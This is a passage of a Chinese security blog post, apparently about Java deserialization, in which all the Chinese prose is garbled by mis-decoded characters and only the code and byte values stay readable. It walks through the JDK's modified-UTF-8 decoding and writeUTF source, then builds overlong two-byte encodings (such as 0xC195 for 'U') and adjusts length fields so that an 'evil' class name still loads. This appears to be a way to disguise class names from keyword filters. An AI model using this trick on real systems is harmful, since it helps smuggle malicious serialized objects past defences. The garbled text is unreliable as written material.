<p>è¿™é‡Œçœ‹åˆ°ä¸‹å›¾ï¼Œæ¯æ¬¡whileä¼šä»<code>bufæ•°æ®æµ</code>é‡Œå–ä¸€ä¸ªå­—ç¬¦å’Œ<code>0xFFåš&amp;è¿ç®—</code>ï¼Œç„¶å<code>b1å³ç§»åŠ¨4ä½</code>ï¼Œå°±æ˜¯<code>b1</code>å»æ‰<code>å³è¾¹å4ä½</code>å‰©ä¸‹çš„äºŒè¿›åˆ¶çš„10è¿›åˆ¶åœ¨<code>0-7</code>çš„èŒƒå›´å°±æ˜¯å±äº<code>1byte</code>çš„ï¼Œä¸ºä»€ä¹ˆæ˜¯è¿™ä¸ªèŒƒå›´å‘¢<code>10000000</code>æ˜¯<code>128</code>ï¼Œ<code>0xxxxxxx</code>åˆšå¥½å°±æ˜¯<code>(0-127)</code>,ç†Ÿæ‚‰asciiå°±çŸ¥é“è¿™ä¸ªèŒƒå›´åŒ…å«<code>æ­£å¸¸å¯æ‰“å°å­—ç¬¦èŒƒå›´(32-126)</code></p>
</blockquote>
<p>è¿™é‡Œè¿˜æ˜¯ä¸¾ä¸ªä¾‹å­å§ eg:</p>
<p><code>'a'</code>çš„äºŒè¿›åˆ¶æ˜¯<code>01100001</code>ï¼Œç»è¿‡<code>&gt;&gt;4</code>è¿ç®—åä¸º<code>0110</code>ï¼Œ10è¿›åˆ¶æ˜¯<code>6</code>ä¼šè¿›å…¥<code>case 6:</code>ä¹Ÿå°±æ˜¯<code>1byte</code></p>
<p><img loading="lazy" src="../images/image-20241212093848728.png" alt="image-20241212093848728"  />
</p>
<p>è¿™é‡Œå¾ˆå®¹æ˜“å‘ç°<code>2byte</code>å¯èƒ½å­˜åœ¨é—®é¢˜ï¼Œæˆ‘å…ˆä¸è®²è¿™ä¸ªï¼Œè¿™é‡Œæˆ‘å…ˆæƒ³åˆ°çš„æ˜¯æ²¡æœ‰<code>case8:</code>å•Šï¼ï¼ï¼é‚£<code>ascii 128</code>æ€ä¹ˆåŠ</p>
<h3 id="128-æ¬§å…ƒç¬¦å·">128 æ¬§å…ƒç¬¦å·<a hidden class="anchor" aria-hidden="true" href="#128-æ¬§å…ƒç¬¦å·">#</a></h3>
<p><img loading="lazy" src="../images/image-20241212100247026.png" alt="image-20241212100247026"  />
</p>
<p>128æ­£å¼æˆ‘ä»¬çš„<code>æ¬§å…ƒç¬¦å·â‚¬</code>ï¼Œè¿™é‡Œæ–¹ä¾¿åˆ†ææˆ‘ç›´æ¥æ”¹äº†evilç±»åï¼Œå‘ç°æ˜¯å¯ä»¥ç”¨çš„</p>
<p><img loading="lazy" src="../images/image-20241212100352223.png" alt="image-20241212100352223"  />
</p>
<p>ç”Ÿæˆçš„æ–‡ä»¶ï¼Œæˆ‘ä»¬å‘ç°<code>â‚¬</code>åœ¨javaä¸­å…¶å®å¯¹åº”<code>3byte</code>ï¼Œå› ä¸ºä»–çš„<code>uincodeç¼–ç </code>æ˜¯<code>U+20AC</code>ï¼Œè¿™é‡ŒæŒ‰ç…§ä¸Šé¢è½¬æ¢è¡¨ï¼Œè¿™é‡Œçªç„¶åŠ æ·±äº†å¯¹è¡¨ä¸­<code>xxx</code>çš„ç†è§£</p>
<p>è¿™é‡Œ<code>xxxä¸€å…±16ä½</code>ï¼Œ<code>20AC</code>çš„äºŒè¿›åˆ¶ä¹Ÿæ˜¯16ä½ï¼Œç„¶åå¡«å…¥åç”Ÿæˆçš„3byteå°±æ˜¯ä»–çš„utf-8ï¼Œï¼ˆhhhä¹‹å‰æ²¡æ³¨æ„è¿™ä¸ªï¼Œåˆšåˆšæƒ³16ä½æ€ä¹ˆ24ä½çš„æ—¶å€™çœ‹åˆ°è¿™ä¸ªæç„¶å¤§æ‚Ÿhhh</p>
<blockquote>
<p>U+0800  U+FFFF  1110xxxx  10xxxxxx  10xxxxxx</p>
</blockquote>
<p><code>20AC</code>çš„äºŒè¿›åˆ¶<code>0010000010101100</code> &ndash;&gt; utf-8: <code>11100010 10000010 10101100</code></p>
<p>åŠ<code>E282AC</code>å¯¹åº”ç€åºåˆ—åŒ–ç”Ÿæˆçš„å†…å®¹ï¼Œè¯´æ˜æ²¡é”™ï¼Œæ‰€ä»¥ä¸èƒ½æŒ‰ç…§asciiç çš„æ€ç»´å»æƒ³utf-8ç¼–ç ï¼Œ<code>ååºåˆ—åŒ–</code>ä¸­æ˜¯æŒ‰<code>ç…§uincodeè½¬åŒ–ä¸ºutf-8</code></p>
<p><img loading="lazy" src="../images/image-20241212100540540.png" alt="image-20241212100540540"  />
</p>
<p>æ—¢ç„¶éƒ½åˆ°è¿™äº†ï¼Œå°±ç®€å•åˆ†æä¸‹ï¼Œ3byteä»–æ˜¯æ€ä¹ˆè½¬åŒ–çš„å§</p>
<h3 id="3byte">3byte<a hidden class="anchor" aria-hidden="true" href="#3byte">#</a></h3>
<p>è¿™é‡Œå¯¹åº”çš„æ˜¯<code>-30ï¼Œ-126ï¼Œ-84</code>è¿™é‡Œå­˜å‚¨éƒ½æ˜¯<code>è¡¥ç </code>ï¼ŒåŠæœ€é«˜ä½ä½1æ—¶ï¼Œè¡¥ç å’ŒåŸç ä¸åŒï¼Œè¿™é‡Œè¿™ä¸‰æœ€é«˜ä½éƒ½æ˜¯<code>1</code>ï¼Œæ‰€ä»¥è¿™é‡Œè¡¥ç æ˜¾ç¤ºå‡ºæ¥éƒ½æ˜¯è´Ÿæ•°å’ŒåŸç ä¸åŒ</p>
<p><img loading="lazy" src="../images/image-20241212104003554.png" alt="image-20241212104003554"  />
</p>
<p>è¿™é‡Œå°±æ˜¯ç®€å•åˆ†æä¸‹ä»£ç é€»è¾‘ï¼Œè¿™é‡Œè¯†åˆ«åˆ°ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯<code>1110</code>å¼€å¤´å=<code>case14:</code>,ç„¶åè¿™é‡Œb3å’Œb2ä¼šè·å–åä¸¤ä½<code>byte</code>ï¼Œè¿™é‡Œ<code>pos+0</code>æ˜¯å› ä¸ºå‰é¢è·å–b1æ—¶<code>b1 = buf[pos++] &amp; 0xFF;</code>ï¼Œposç”¨çš„<code>å++</code>æ‰€ä»¥poså®šä½ç¬¦å·²ç»å‘åäº†ä¸€ä½</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">if ((b2 &amp; 0xC0) != 0x80 || (b3 &amp; 0xC0) != 0x80) {
</span></span></code></pre></div><p>è¿™ä¸ªæ˜¯<code>æ£€æµ‹ b2 b3</code>æ˜¯ä¸æ˜¯ä»¥<code>10xx xxxx</code>çš„æ ¼å¼ï¼Œ<code>C0</code>æ˜¯<code>1100 0000</code>ï¼Œè·Ÿä»–åš<code>&amp;</code>åªæœ‰10xx xxxxçš„æ ¼å¼æ‰ä¼š==0x80</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="w"> </span><span class="p">(((</span><span class="n">b1</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x0F</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">12</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="p">((</span><span class="n">b2</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">6</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="p">((</span><span class="n">b3</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">0</span><span class="p">))</span><span class="w">
</span></span></span></code></pre></div><p>ç„¶åçœ‹åˆ°è¿™ä¸€æ®µï¼Œå…¶å®å°±æ˜¯æ¢å¤<code>â‚¬çš„uincodeç¼–ç çš„äºŒè¿›åˆ¶</code>ï¼Œè¿™é‡Œæƒ³æˆäºŒè¿›åˆ¶å°±å¾ˆå¥½ç†è§£äº†</p>
<p>è¿™é‡Œ<code>b1 &amp; 0000 1111</code> å¾—åˆ°å°±æ˜¯<code>0000 0010</code>ç„¶åå‘å·¦ç§»åŠ¨12ä½ <code>0010 0000 0000 0000</code> è¿™ä¸æ˜¯å°±uincodeç¼–ç äºŒè¿›åˆ¶å‰4ä½ä¹ˆï¼Œç„¶åæœ€åè¿›è¡Œ<code>orè¿ç®—</code>ï¼Œä¸å°±æ˜¯å¾—åˆ°<code>å®Œæ•´çš„uincodeç¼–ç çš„äºŒè¿›åˆ¶</code>ä¹ˆï¼Œç„¶å<code>10è¿›åˆ¶æ˜¯8364</code>å†<code>char</code>è½¬æ¢æˆå­—ç¬¦</p>
<h3 id="real-128">real 128<a hidden class="anchor" aria-hidden="true" href="#real-128">#</a></h3>
<blockquote>
<p>ä½†æ˜¯æˆ‘ä»¬æ„è¯†åˆ°<code>â‚¬</code>åªæ˜¯asciiä¸­çš„128ï¼Œå¹¶ä¸æ˜¯uincodeä¸­çš„128ï¼ŒåŠ<code>u+0080</code>ï¼Œè·Ÿæˆ‘ä»¬æƒ³è¦åˆ†æçš„ä¸œè¥¿è²Œä¼¼æœ‰ç‚¹ä¸ä¸€æ ·ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥çœ‹çœ‹å¦‚æœæ˜¯128ï¼Œjavaæ˜¯æ€ä¹ˆç”Ÿæˆçš„</p>
</blockquote>
<p>æ ¹æ®<code>getUTFLength()</code>ä»£ç æˆ‘ä»¬å¯ä»¥çŸ¥é“128æ˜¯ä¼šèµ°åˆ°<code>2byte</code>çš„</p>
<p>è¿™é‡Œå‘ç°ä¼šç”Ÿæˆä¸¤ä¸ªbyte 194 å’Œ 130   11000010 10000010éƒ½æ˜¯ç¬¦åˆè½¬ç è§„åˆ™çš„ï¼Œå¹¶ä¸ä¼šå‡ºç°æˆ‘ä»¬æƒ³è±¡ä¸­utf-8 128å»è½¬uincodeæ²¡å¯¹åº”<code>case8ï¼š</code>çš„æƒ…å†µï¼Œå› ä¸ºå­˜å‚¨ä¸ºutf-8ç¼–ç çš„æ—¶å€™æ ¹æœ¬ä¸æ˜¯128ï¼Œæƒ³å¤šäº†hhhï¼ˆ128utf-8æœ¬èº«å°±ä¸åˆæ³•ï¼‰</p>
<p><img loading="lazy" src="../images/image-20241216161152771.png" alt="image-20241216161152771"  />
</p>
<h2 id="0x04-å¼€å§‹æ„é€ ">0x04 å¼€å§‹æ„é€ <a hidden class="anchor" aria-hidden="true" href="#0x04-å¼€å§‹æ„é€ ">#</a></h2>
<p><img loading="lazy" src="../images/image-20241212152019226.png" alt="image-20241212152019226"  />
</p>
<p>2byteä»£ç é€»è¾‘å…¶å®éƒ½ä¸ç”¨çœ‹äº†ï¼Œè·Ÿ3byteå·®ä¸äº†å¤šå°‘ï¼Œå°±æ˜¯è®©xxxé‡Œé¢çš„ä¸œè¥¿å’Œæˆ‘ä»¬è¦<code>æ„é€ çš„äºŒè¿›åˆ¶</code>ä¸€æ ·å°±è¡Œäº†ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸€èˆ¬æ„é€ çš„éƒ½æ˜¯å¯æ‰“å°å­—ç¬¦ï¼Œä¸€èˆ¬åªæœ‰8ä½2è¿›åˆ¶ï¼Œè¿™é‡Œxxxæœ‰11ä½ï¼Œç®€å•<code>å‰é¢å¡«0</code>å°±å¥½</p>
<p><img loading="lazy" src="../images/image-20241212152352346.png" alt="image-20241212152352346"  />
</p>
<p>è¿™ä¸ªæ‹¿<code>U</code>å®éªŒï¼ŒäºŒè¿›åˆ¶æ˜¯<code>0101 0101</code> å¡«3ä¸ª0 <code>000 0101 0101</code>ï¼Œç„¶åæŒ‰ç…§2byteæ ¼å¼å¾—åˆ° <code>11000001 10010101</code> åŠ<code>ã€0xC195</code></p>
<p><img loading="lazy" src="../images/image-20241212153213727.png" alt="image-20241212153213727"  />
</p>
<p>æˆ‘ä»¬å°†<code>U</code>æ›¿æ¢æˆ<code>2byte</code>ï¼Œçœ‹åˆ°ä¸‹å›¾æˆåŠŸå®ç°</p>
<p><img loading="lazy" src="../images/image-20241212153338851.png" alt="image-20241212153338851"  />
</p>
<p><img loading="lazy" src="../images/image-20241212153422195.png" alt="image-20241212153422195"  />
</p>
<p>ä½†æ˜¯læ²¡åŠ è½½å‡ºæ¥å› ä¸º<code>2byteè¦å ç”¨ä¸¤ä¸ªé•¿åº¦</code>ï¼Œè€Œutflenè¿˜æ˜¯åŸæ¥çš„é•¿åº¦ï¼Œæ‰€ä»¥è®©å…¶+1å°±å¥½</p>
<p>å…¶å®ä¸éš¾æƒ³åˆ°æ—¢ç„¶ååºåˆ—åŒ–æ˜¯å°†utf-8è½¬åŒ–æˆuincodeï¼Œé‚£<code>åºåˆ—åŒ–</code>å…¶å®å°±æ˜¯å°†<code>uincodeè½¬åŒ–æˆutf-8ç¼–ç </code>å­˜å‚¨çš„</p>
<h3 id="writeutf">writeUTF<a hidden class="anchor" aria-hidden="true" href="#writeutf">#</a></h3>
<p>æˆ‘ä»¬ç®€å•è°ƒè¯•ä¸‹å°±èƒ½å‘ç°<code>writeUTF</code>è¿™ä¸ªæ–¹æ³•æ˜¯ç”¨æ¥è½¬åŒ–ç¼–ç å­˜å‚¨çš„</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">writeUTF</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">writeUTF</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="n">getUTFLength</span><span class="p">(</span><span class="n">s</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kt">void</span><span class="w"> </span><span class="nf">writeUTF</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">utflen</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">utflen</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0xFFFFL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UTFDataFormatException</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">writeShort</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="w"> </span><span class="n">utflen</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">utflen</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">length</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">writeBytes</span><span class="p">(</span><span class="n">s</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">writeUTFBody</span><span class="p">(</span><span class="n">s</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>è¿™é‡Œæˆ‘æƒ³æ„é€ çš„æ˜¯2byteçš„æ•°æ®ï¼Œæ‰€ä»¥è¿™é‡Œ<code>if (utflen == (long) s.length()) {</code>è‚¯å®šæ˜¯<code>false</code>ï¼Œè¿›å…¥<code>writeUTFBody</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">writeUTFBody</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">int</span><span class="w"> </span><span class="n">limit</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MAX_BLOCK_SIZE</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">3</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">int</span><span class="w"> </span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">length</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">len</span><span class="p">;</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="kt">int</span><span class="w"> </span><span class="n">csize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Math</span><span class="p">.</span><span class="na">min</span><span class="p">(</span><span class="n">len</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">off</span><span class="p">,</span><span class="w"> </span><span class="n">CHAR_BUF_SIZE</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">s</span><span class="p">.</span><span class="na">getChars</span><span class="p">(</span><span class="n">off</span><span class="p">,</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">csize</span><span class="p">,</span><span class="w"> </span><span class="n">cbuf</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">cpos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">cpos</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">csize</span><span class="p">;</span><span class="w"> </span><span class="n">cpos</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="kt">char</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cbuf</span><span class="o">[</span><span class="n">cpos</span><span class="o">]</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pos</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">limit</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">0x007F</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">buf</span><span class="o">[</span><span class="n">pos</span><span class="o">++]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="n">c</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0x07FF</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">buf</span><span class="o">[</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">2</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">0x80</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">buf</span><span class="o">[</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">1</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">0x80</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">6</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">buf</span><span class="o">[</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">0</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">0xE0</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">12</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x0F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">pos</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">3</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">buf</span><span class="o">[</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">1</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">0x80</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">buf</span><span class="o">[</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">0</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">0xC0</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">6</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x1F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">pos</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">2</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">    </span><span class="c1">// write one byte at a time to normalize block</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">0x007F</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">write</span><span class="p">(</span><span class="n">c</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0x07FF</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">write</span><span class="p">(</span><span class="n">0xE0</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">12</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x0F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">write</span><span class="p">(</span><span class="n">0x80</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">6</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">write</span><span class="p">(</span><span class="n">0x80</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">write</span><span class="p">(</span><span class="n">0xC0</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">6</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x1F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">write</span><span class="p">(</span><span class="n">0x80</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">off</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">csize</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
